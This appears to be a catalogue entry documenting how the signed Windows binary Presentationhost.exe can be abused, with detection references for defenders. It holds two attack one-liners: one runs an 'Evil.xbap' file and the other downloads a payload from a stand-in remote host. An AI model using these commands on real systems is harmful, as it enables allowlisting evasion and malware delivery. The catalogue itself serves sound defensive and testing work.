---
Name: Presentationhost.exe
Description: File is used for executing Browser applications
Author: Oddvar Moe
Created: 2018-05-25
Commands:
  - Command: Presentationhost.exe C:\temp\Evil.xbap
    Description: Executes the target XAML Browser Application (XBAP) file
    Usecase: Execute code within xbap files
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: Presentationhost.exe https://example.com/payload
    Description: It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)
    Usecase: Downloads payload from remote server
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
Full_Path:
  - Path: C:\Windows\System32\Presentationhost.exe
  - Path: C:\Windows\SysWOW64\Presentationhost.exe
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/a38c0218765a89f5d18eadd49639c72a5d25d944/rules/windows/process_creation/win_susp_presentationhost_execution.yml
  - IOC: Execution of .xbap files may not be common on production workstations
Resources:
  - Link: https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
  - Link: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
  - Person: Nir Chako (Pentera)
    Handle: '@C_h4ck_0'
---
